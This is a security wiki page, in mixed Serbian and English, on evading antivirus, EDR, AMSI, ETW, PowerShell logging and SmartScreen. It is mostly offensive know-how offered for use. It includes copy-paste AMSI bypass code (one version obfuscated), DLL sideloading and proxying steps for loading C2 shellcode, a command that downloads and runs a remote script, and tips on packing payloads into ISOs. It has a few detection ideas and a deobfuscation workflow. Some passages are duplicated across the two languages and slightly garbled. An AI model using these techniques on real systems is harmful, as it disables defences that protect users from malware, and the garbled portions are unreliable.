# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defender-a

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defender-a lažiranjem drugog AV-a.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Trenutno, AV-i koriste različite metode za proveru da li je fajl zlonameran ili ne: static detection, dynamic analysis, i za naprednije EDR-e, behavioural analysis.

### **Static detection**

Static detection se postiže označavanjem poznatih zlonamernih stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i izvlačenjem informacija iz samog fajla (npr. file description, company name, digital signatures, icon, checksum, itd.). To znači da korišćenje poznatih javnih alata može dovesti do bržeg otkrivanja, pošto su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da se zaobiđe ovakva detekcija:

- **Encryption**

Ako enkriptuješ binarni fajl, AV neće moći da detektuje tvoj program, ali ćeš morati da obezbediš loader koji dekriptuje i pokreće program u memoriji.

- **Obfuscation**

Ponekad je dovoljno promeniti neke stringove u binarnom fajlu ili skripti da bi prošao pored AV-a, ali to može biti dugotrajan posao u zavisnosti od toga šta pokušavaš da obfuskuješ.

- **Custom tooling**

Ako razviješ sopstvene alate, neće postojati poznati loši signaturi, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način da proveriš protiv Windows Defender static detection je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On praktično deli fajl na više segmenata i traži od Defender-a da skenira svaki pojedinačno; na taj način može da ti kaže tačno koji su stringovi ili bajtovi označeni u tvom binarnom fajlu.

Toplo preporučujem da pogledaš ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion.

### **Dynamic analysis**

Dynamic analysis je kada AV pokreće tvoj binarni fajl u sandbox-u i posmatra zlonamerno ponašanje (npr. pokušaj dekriptovanja i čitanja lozinki iz browser-a, pravljenje minidump-a nad LSASS, itd.). Ovaj deo može biti malo komplikovaniji, ali evo nekoliko stvari koje možeš uraditi da izbegneš sandbokse.

- Sleep before execution — U zavisnosti od implementacije, može biti odličan način zaobilaženja AV-ove dynamic analysis. AV-i obično imaju veoma malo vremena za skeniranje fajlova kako ne bi ometali rad korisnika, pa korišćenje dugih sleep-ova može poremetiti analizu binarnih fajlova. Problem je što mnogi sandbox-i jednostavno mogu preskočiti sleep u zavisnosti od načina implementacije.
- Checking machine's resources — Obično sandboksi imaju vrlo malo resursa (npr. < 2GB RAM), da ne bi usporili mašinu korisnika. Ovde možeš biti kreativan: npr. proverom temperature CPU-a ili brzine ventilatora — ne sve će biti implementirano u sandbox-u.
- Machine-specific checks — Ako želiš da ciljano napadneš korisnika čija je radna stanica pridružena domenu "contoso.local", možeš proveriti domen računara da li se poklapa, i ako se ne poklapa, aplikacija može da izađe.

Ispostavilo se da je computername Microsoft Defender-ovog Sandbox-a HAL9TH, pa možeš proveriti ime računara u svom malware-u pre detonacije — ako se ime poklapa sa HAL9TH, znači da si unutar defender-ovog sandbox-a i možeš naterati program da izađe.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još par odličnih saveta od [@mgeeky](https://twitter.com/mariuszbit) za rad protiv Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kao što smo već rekli u ovom postu, public tools će na kraju biti detected, pa treba da postaviš sebi pitanje:

Na primer, ako želiš da dump-uješ LSASS, da li zaista moraš da koristiš mimikatz? Ili bi mogao da nađeš neki drugi, manje poznat projekat koji takođe dump-uje LSASS.

Ispravni odgovor je verovatno potonji. Uzimajući mimikatz kao primer, verovatno je jedan od, ako ne i najviše flagovanih komada kod-a od strane AV-a i EDR-a — dok je projekat sjajan, veoma je problematično raditi sa njim u smislu zaobilaženja AV-a, pa jednostavno potraži alternative za cilj koji pokušavaš da postigneš.

> [!TIP]
> Prilikom modifikovanja payload-ova radi evasion, obavezno isključi automatic sample submission u defender-u, i molim te, ozbiljno, NE UPLADUJ NA VIRUSTOTAL ako ti je cilj dugoročna evasion. Ako želiš da proveriš da li tvoj payload detektuje određeni AV, instaliraj ga na VM, pokušaj da isključiš automatic sample submission i testiraj tamo dok ne budeš zadovoljan rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **prioritet daj korišćenju DLL-a za evasion** — iz mog iskustva, DLL fajlovi su obično **mnogo manje detektovani** i analizirani, pa je to veoma jednostavan trik da se u nekim slučajevima izbegne detekcija (ako tvoj payload ima način da radi kao DLL, naravno).

Kao što vidimo na ovoj slici, DLL Payload iz Havoc-a ima detection rate 4/26 na antiscan.me, dok EXE payload ima 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje normalnog Havoc EXE payload-a vs normalnog Havoc DLL-a</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možeš koristiti sa DLL fajlovima da bi bio mnogo stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi DLL search order kojom se loader služи tako što pozicionira i victim application i malicious payload(s) jedan pored drugog.

Možeš proveriti programe podložne DLL Sideloading koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijackingu unutar "C:\Program Files\\" i DLL fajlova koje pokušavaju da učitaju.

Toplo preporučujem da **istražite DLL Hijackable/Sideloadable programe sami**, ova tehnika je prilično stealthy ako se pravilno uradi, ali ako koristite javno poznate DLL Sideloadable programe, lako možete biti otkriveni.

Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita neće automatski pokrenuti vaš payload, jer program očekuje određene funkcije u tom DLL-u; da bismo to rešili, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program pravi iz proxy (i malicioznog) DLL-a ka originalnom DLL-u, čime se očuva funkcionalnost programa i omogućava rukovanje izvršavanjem vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati dva fajla: DLL source code template i originalno preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading i takođe [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) da saznate više o onome što smo detaljnije diskutovali.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Učitaj `TargetDll` ako već nije učitan
- Reši `TargetFunc` iz njega

Key behaviors to understand:
- Ako je `TargetDll` KnownDLL, on se dobija iz zaštićenog KnownDLLs namespace-a (e.g., ntdll, kernelbase, ole32).
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji uključuje direktorijum modula koji vrši forward rezoluciju.

Ovo omogućava indirektni sideloading primitiv: pronađite potpisani DLL koji eksportuje funkciju forwardanu na modul čije ime nije KnownDLL, zatim postavite tog potpisanog DLL-a u isti direktorijum zajedno sa DLL-om kojim kontroliše napadač, koji je tačno imenovan kao forwardani ciljni modul. Kada se forwardani eksport pozove, loader reši forward i učita vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, pa se rešava putem normalnog redosleda pretrage.

PoC (copy-paste):
1) Kopirajte potpisanu sistemsku DLL datoteku u direktorijum u koji se može pisati
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u isti folder. Minimalni DllMain je dovoljan da se dobije izvršavanje koda; nije potrebno implementirati forwarded function da bi se trigger DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokrenite prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Posmatrano ponašanje:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Dok rešava `KeyIsoSetAuditingInterface`, loader prati prosleđivanje na `NCRYPTPROV.SetAuditingInterface`
- Loader potom učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku "missing API" tek nakon što se `DllMain` već izvršio

Saveti za otkrivanje:
- Usredsredite se na prosleđene eksportovane funkcije gde ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete izlistati prosleđene eksportovane funkcije alatima kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwardera da biste potražili kandidate: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., rundll32.exe) koji učitavaju potpisane DLL-ove iz nesistemskih putanja, praćeno učitavanjem non-KnownDLLs sa istim osnovnim imenom iz tog direktorijuma
- Upozorite na lance proces/module poput: `rundll32.exe` → nesistemski `keyiso.dll` → `NCRYPTPROV.dll` na putanjama koje su upisive od strane korisnika
- Primijenite politike integriteta koda (WDAC/AppLocker) i zabranite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite vaš shellcode na neupadljiv način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša — ono što radi danas može biti otkriveno sutra, zato se nikada ne oslanjajte samo na jedan alat; ako je moguće, pokušajte povezivati više evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku su AVs bili u stanju da skeniraju samo **files on disk**, pa ako biste nekako uspeli da izvršite payloads **directly in-memory**, AV nije mogao ništa da uradi da to spreči, jer nije imao dovoljan uvid.

AMSI feature je integrisan u sledeće Windows komponente.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ovo omogućava antivirus rešenjima da pregledaju ponašanje skripti tako što izlaže sadržaj skripti u obliku koji je nekriptovan i unobfuscated.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju kako prepends `amsi:` i zatim putanju do izvršnog fajla iz kog je skripta pokrenuta, u ovom slučaju powershell.exe

Nismo ispisali nijedan fajl na disk, a opet smo otkriveni in-memory zbog AMSI.

Štaviše, počevši od **.NET 4.8**, C# kod takođe prolazi kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])` pri učitavanju za in-memory izvršenje. Zato se preporučuje korišćenje nižih verzija .NET-a (npr. 4.7.2 ili niže) za in-memory izvršenje ako želite da izbegnete AMSI.

Postoji nekoliko načina za zaobilaženje AMSI-ja:

- **Obfuscation**

Pošto AMSI uglavnom radi sa statičkim detekcijama, modifikovanje skripti koje pokušavate da učitate može biti dobar način za evading detection.

Međutim, AMSI ima mogućnost unobfuscating skripti čak i ako ima više slojeva, tako da obfuscation može biti loša opcija u zavisnosti od načina na koji je urađena. To otežava jednostavno izbegavanje. Ipak, ponekad je dovoljno promeniti par imena promenljivih i bićete u redu, pa sve zavisi koliko je nešto označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u powershell (takođe cscript.exe, wscript.exe, itd.) proces, moguće je lako manipulisati njime čak i kada se radi kao neprivilegovan korisnik. Zbog ovog propusta u implementaciji AMSI-ja, istraživači su pronašli više načina da zaobiđu AMSI skeniranje.

**Forcing an Error**

Prinudno izazivanje greške pri inicijalizaciji AMSI-ja (amsiInitFailed) će rezultirati time da se za trenutni proces neće pokrenuti nikakvo skeniranje. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio signature da spreči širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Sve što je bilo potrebno bila je jedna linija powershell koda da učini AMSI neupotrebljivim za trenutni powershell proces. Ta linija je, naravno, označena od strane samog AMSI-ja, pa je potrebna određena modifikacija da bi se ova tehnika mogla koristiti.

Evo modifikovanog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Molimo pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

Možete koristiti alat kao što je **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da uklonite detektovani AMSI potpis iz memorije trenutnog procesa. Ovaj alat radi tako što skenira memoriju trenutnog procesa u potrazi za AMSI potpisom i zatim ga prepisuje NOP instrukcijama, efikasno uklanjajući ga iz memorije.

**AV/EDR products that uses AMSI**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

Možete pronaći listu AV/EDR proizvoda koji koriste AMSI u **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:

Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati svoje skripte bez skeniranja od strane AMSI. Možete to uraditi ovako:
```bash
powershell.exe -version 2
```
## PS logovanje

PowerShell logging je funkcija koja vam omogućava da beležite sve PowerShell komande koje se izvršavaju na sistemu. Ovo može biti korisno za audit i rešavanje problema, ali može predstavljati i problem za napadače koji žele da izbegnu detekciju.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: Možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) za ovu svrhu.
- **Koristite Powershell verziju 2**: Ako koristite PowerShell verzije 2, AMSI se neće učitati, pa možete izvršavati svoje skripte bez skeniranja od strane AMSI. Možete to uraditi ovako: `powershell.exe -version 2`
- **Koristite Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da spawn-ujete powershell bez odbrane (ovo je ono što `powerpick` iz Cobal Strike koristi).

## Obfuskacija

> [!TIP]
> Nekoliko tehnika obfuskacije zasniva se na enkripciji podataka, što povećava entropiju binarnog fajla i olakšava AV-ima i EDR-ovima da ga detektuju. Budite oprezni zbog toga i možda primenjujte enkripciju samo na specifične delove koda koji su osetljivi ili ih treba sakriti.

### Deobfuskacija .NET binarnih fajlova zaštićenih ConfuserEx

Pri analizi malvera koji koristi ConfuserEx 2 (ili komercijalne forkove) često se susrećete sa više slojeva zaštite koji blokiraju dekompajlere i sandbokse. Radni tok ispod pouzdano **vraća skoro-originalni IL** koji potom može biti dekompajliran u C# alatima kao što su dnSpy ili ILSpy.

1.  Uklanjanje anti-tamper zaštite – ConfuserEx enkriptuje svako *method body* i dekriptuje ga unutar statičkog konstruktora *module* (`<Module>.cctor`). Ovo takođe menja PE checksum, pa će bilo koja modifikacija srušiti binarni fajl. Koristite **AntiTamperKiller** da locirate enkriptovane metadata tabele, povratite XOR ključeve i upišete čist assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi vlastitog unpackera.

2.  Oporavak simbola / control-flow – prosledite *clean* fajl u **de4dot-cex** (ConfuserEx-aware fork de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Opcije:
• `-p crx` – izaberite ConfuserEx 2 profil  
• de4dot će poništiti control-flow flattening, vratiti originalne namespace-ove, klase i imena promenljivih i dekriptovati konstantne stringove.

3.  Uklanjanje proxy poziva – ConfuserEx zamenjuje direktne pozive metoda lakim wrapperima (poznatim i kao *proxy calls*) da bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka treba da primetite normalne .NET API-je kao što su `Convert.FromBase64String` ili `AES.Create()` umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite rezultujući binarni fajl u dnSpy, pretražite velike Base64 blob-ove ili korišćenje `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste locirali *pravi* payload. Često malver čuva payload kao TLV-enkodiran bajt niz inicijalizovan unutar `<Module>.byte_0`.

Gornji lanac vraća tok izvršavanja **bez** potrebe da se maliciozni uzorak izvrši – korisno pri radu na offline radnoj stanici.

> 🛈  ConfuserEx proizvodi custom atribut nazvan `ConfusedByAttribute` koji može da se koristi kao IOC za automatsku trijažu uzoraka.

#### Jednolinijski primer
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) kompajlacionog paketa sposoban da poveća bezbednost softvera kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstrira kako koristiti `C++11/14` jezik za generisanje, u vreme kompajliranja, obfuscated code bez korišćenja bilo kog eksternog alata i bez modifikacije kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj ofusciranih operacija generisanih pomoću C++ template metaprogramming framework-a koji će otežati život osobi koja želi da crack-uje aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji je sposoban da ofuskuje razne PE fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne izvršne fajlove.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je fine-grained code obfuscation framework za jezike podržane od strane LLVM koristeći ROP (return-oriented programming). ROPfuscator obfuscates program na nivou assembly koda transformišući regularne instrukcije u ROP lance, narušavajući našu prirodnu percepciju normalnog toka kontrole.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nimu
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL u shellcode i zatim ih učita

## SmartScreen & MoTW

Možda ste videli ovaj ekran kada preuzimate neke izvršne fajlove sa interneta i pokušate da ih izvršite.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen da zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi na bazi reputacije, što znači da aplikacije koje se retko preuzimaju aktiviraće SmartScreen, upozoravajući i sprečavajući krajnjeg korisnika da izvrši fajl (iako fajl i dalje može biti pokrenut klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kojeg je fajl preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani sa **trusted** signing certificate **won't trigger SmartScreen**.

Veoma efikasan način da sprečite da vaši payloads dobiju Mark of The Web je da ih spakujete u neku vrstu kontejnera, poput ISO. To se dešava zato što Mark-of-the-Web (MOTW) **cannot** biti primenjen na **non NTFS** volumene.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payloads u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo zaobilaženja SmartScreen-a pakovanjem payloads unutar ISO fajlova koristeći [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windows-u koji omogućava aplikacijama i komponentama sistema da **loguju događaje**. Međutim, on se takođe može koristiti od strane security proizvoda za praćenje i detekciju zlonamernih aktivnosti.

Slično načinu na koji se AMSI onemogućava (bypassa), moguće je i učiniti da funkcija korisničkog prostora `EtwEventWrite` odmah vrati kontrolu bez logovanja događaja. Ovo se postiže patchovanjem funkcije u memoriji tako da odmah vraća vrednost, efektivno onemogućavajući ETW logovanje za taj proces.

Više informacija možete naći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries u memoriju je poznato već dugo i i dalje je odličan način za pokretanje post-exploitation alata bez da te detektuje AV.

Pošto će payload biti učitan direktno u memoriju bez dodirivanja diska, moraćemo se brinuti samo o patchovanju AMSI za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već pruža mogućnost izvršavanja C# assemblies direktno u memoriji, ali postoje različiti načini da se to uradi:

- **Fork\&Run**

Podrazumeva **pokretanje novog žrtvenog procesa**, injektovanje vašeg post-exploitation zlonamernog koda u taj novi proces, izvršenje koda i nakon završetka ubijanje novog procesa. Ovo ima i prednosti i nedostatke. Prednost fork and run metode je što izvršenje odvija **izvan** našeg Beacon implant procesa. To znači da ako nešto u našoj post-exploitation akciji krene po zlu ili bude uhvaćeno, postoji **mnogo veća šansa** da naš **implant ostane živ.** Nedostatak je što imate **veću šansu** da budete otkriveni od strane **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injektovanju post-exploitation zlonamernog koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali nedostatak je što ako nešto pođe po zlu tokom izvršenja vašeg payload-a, postoji **mnogo veća šansa** da **izgubite svoj beacon** jer proces može da se sruši.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o C# Assembly loading, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitavati C# Assemblies **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i S3cur3th1sSh1t-ov video (https link).

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati zlonamerni kod koristeći druge jezike tako što se kompromitovanom računaru omogući pristup **interpreter environment** instaliranom na Attacker Controlled SMB share.

Dozvoljavanjem pristupa Interpreter Binaries i okruženju na SMB share-u možete **izvršavati proizvoljan kod u tim jezicima u memoriji** kompromitovanog sistema.

